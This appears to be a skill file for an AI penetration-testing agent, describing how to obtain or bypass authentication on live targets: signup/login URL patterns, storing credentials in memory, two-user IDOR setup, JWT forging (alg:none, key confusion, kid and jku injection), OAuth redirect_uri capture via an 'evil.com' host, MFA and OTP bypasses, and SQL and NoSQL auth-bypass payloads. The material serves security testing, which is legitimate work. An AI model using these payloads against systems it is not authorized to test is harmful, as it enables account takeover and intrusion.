---
description: Authentication discovery for black-box / live-target testing — signup+login URL patterns, token extraction, the `auth/` memory convention, and the two-user IDOR setup. Load when an endpoint needs auth and the finding doesn't supply credentials.
---

# Authentication discovery

Use this when a target endpoint requires auth and the finding does **not**
already give you credentials or a login flow. If the finding *does* supply
auth instructions, use those exactly — skip this.

## Credentials live in memory under `auth/`

Persist anything you obtain (creds, token, cookies, the working signup/login
URLs) with `write_memory` under the **`auth/`** prefix, so later steps and the
sandbox can reuse them without re-discovering:

```
write_memory(name="auth/creds", memory="email=e@t.com password=Testpass1! token=eyJ...")
write_memory(name="auth/endpoints", memory="signup=/identity/api/auth/signup login=/identity/api/auth/login")
```

Read them back (`read_memory name="auth/creds"`) before re-authenticating.

## Discovery patterns

The auth endpoint may not share the target's URL prefix. Try these **in order,
stop at the first that returns 200**:

Signup:
```
POST <BASE_URL>/identity/api/auth/signup  {"name":"Test","email":"exploit1@test.com","number":"1234567890","password":"Testpass1!"}
POST <BASE_URL>/api/auth/signup           {"name":"Test","email":"exploit1@test.com","number":"1234567890","password":"Testpass1!"}
POST <BASE_URL>/api/v1/register           {"username":"exploituser1","password":"Testpass1!","email":"exploit1@test.com"}
POST <BASE_URL>/users/v1/register         {"username":"exploituser1","password":"Testpass1!","email":"exploit1@test.com"}
```

Login (same email/password as signup):
```
POST <BASE_URL>/identity/api/auth/login   {"email":"exploit1@test.com","password":"Testpass1!"}
POST <BASE_URL>/api/auth/login            {"email":"exploit1@test.com","password":"Testpass1!"}
POST <BASE_URL>/api/v1/login              {"username":"exploituser1","password":"Testpass1!"}
POST <BASE_URL>/users/v1/login            {"username":"exploituser1","password":"Testpass1!"}
```

Rules:
- If signup returns **200**, go straight to login. If **409** (already exists),
  go straight to login anyway — do NOT try a second signup pattern.

## Pin the credential to the session (decision tree)

Inspect the login response and branch on what it hands you:

- **Bearer token in JSON body** (common fields: `token`, `auth_token`,
  `access_token`, `jwt`) →
  `http_session_set(auth={"kind":"bearer","token":"<token>"})`.
- **Session cookie, no token in body** → do nothing special: the http session
  keeps its own cookie jar, so the cookie set by the login response is replayed
  automatically on subsequent requests. For **state-changing** requests
  (POST/PUT/DELETE) you usually also need a CSRF token — harvest it from the
  login/HTML response body or a `/csrf` (a.k.a. `/api/csrf-token`) endpoint and
  echo it back via the `X-CSRF-Token` header (or the matching hidden form
  field). Common cookie names: `session`, `sid`, `connect.sid`, `JSESSIONID`,
  `laravel_session`.
- **Separate `refresh_token`** → save it under `auth/refresh`, and use it to
  mint a fresh `access_token` when the current one expires (POST the refresh
  token to `/token/refresh` / `/oauth/token` `grant_type=refresh_token`) instead
  of re-running the whole login.
- **API key** (returned once, or supplied by the finding) →
  `http_session_set(headers={"X-API-Key": "<key>"})` (header name varies:
  `Authorization: ApiKey ...`, `X-Api-Key`, `api_key` query param).

## Two-user setup (for IDOR)

Register a **second** user (`exploit2@test.com`), but stay logged in as user 1.
Note user 2's resource IDs, then try to access them with user 1's token.
Keep both users' creds in memory under `auth/user1` and `auth/user2`.

## After you obtain a JWT — try to forge it

Decode the header + payload (base64url, no signature needed). Branch on `alg`:

**HS\* (HMAC):** the signature is keyed by a shared secret — crack it offline.
Run `pyjwt`/`jwt_tool` in the code-exec sandbox against a common-secrets list
(`secret`, `password`, `changeme`, `jwt`, plus the app name / host). On a hit,
re-sign with elevated claims: `admin:true`, `role:admin`, or a swapped
`sub` / `user_id` pointing at another account.

**RS\* (RSA):** no secret to crack — attack the verification logic instead:
- **alg:none** — set header `alg` to `none`/`None` and strip the signature.
- **RS256 → HS256 key confusion** — sign with HS256 using the server's RSA
  **public** key as the HMAC secret. Fetch the key from `/jwks.json`,
  `/.well-known/jwks.json`, or extract it from the TLS cert.
- **kid abuse** — path traversal `kid:"../../dev/null"` signed with an empty
  key, or SQLi in `kid`.
- **jku / jwk header injection** — point at an attacker-hosted key.
- **null-signature** (CVE-2020-28042) — empty signature segment.

Forge in the code-exec sandbox (`pyjwt` is available — see the code-exec
skill), then replay via `http_request` and cite the elevated response. Persist
any forged-token success under `auth/` (e.g. `auth/forged-jwt`).

## OAuth / OIDC targets

If login redirects to an `/authorize` or `/oauth/*` endpoint, or you find
`/.well-known/openid-configuration`, test the flow itself:
1. **redirect_uri** — set it to an attacker / open-redirect / `localhost.evil.com`
   host to capture the leaked `code`/`token`.
2. **state** — missing or non-validated `state` → callback CSRF / forced
   account linking.
3. **code replay** — reuse an authorization code a second time.
4. **scope tampering** — downgrade/alter `scope` to bypass `redirect_uri`
   filters.
5. **Referer leak** — token/code leaking in the `Referer` header after callback.

Persist discovered `client_id` / `redirect_uri` under `auth/oauth`.

## When login is multi-step / MFA-gated

If login returns "2FA required" / a `verify`-OTP step instead of a token, try
these before giving up:
- **Force-browse past it** — hit the post-auth endpoint directly with whatever
  partial session/token the first step gave you; the 2FA step may not be
  enforced server-side.
- **Code-validation bypass** — submit `code:null`, `000000`, an empty string, or
  the code as an array (`code:[123456]` / `code[]=123456`) — weak comparisons
  accept these.
- **OTP replay** — replay a previously *used* OTP; if it isn't invalidated after
  use it's still valid.
- **Leaked code** — check the OTP-submit response body, headers, and any inlined
  JS for the expected code echoed back.
- **Response tampering** — flip a `verified:false`→`true` flag or a `401`→`200`
  status on the verify response (works when the client trusts it).
- **Throttling** — if none work, check whether the OTP endpoint rate-limits at
  all; an unthrottled 6-digit code is brute-forceable (hand the iteration to the
  code-exec skill).

## If you can't get valid creds, try to bypass

When signup/login won't yield creds, attack the auth check itself:
- **SQLi auth bypass** in the username/password fields: `admin' --`,
  `' OR 1=1-- `, `admin'/*`, `" OR ""="`.
- **Auth-flag parameter modification** — if the response or a follow-up request
  carries flags like `authenticated=1`, `role=admin`, `isAdmin=true`, flip them.
- **Type juggling** — `{"password": true}`, NoSQL operator injection
  `{"password": {"$ne": null}}` / `{"username": {"$gt": ""}}`, or array coercion
  `password[]=`.
- **Predictable sessions** — if session IDs are sequential/guessable, mint or
  guess another user's session.

Hand any iterative SQLi-bypass / boolean-blind extraction to the code-exec
skill. Persist a working bypass under `auth/bypass`.
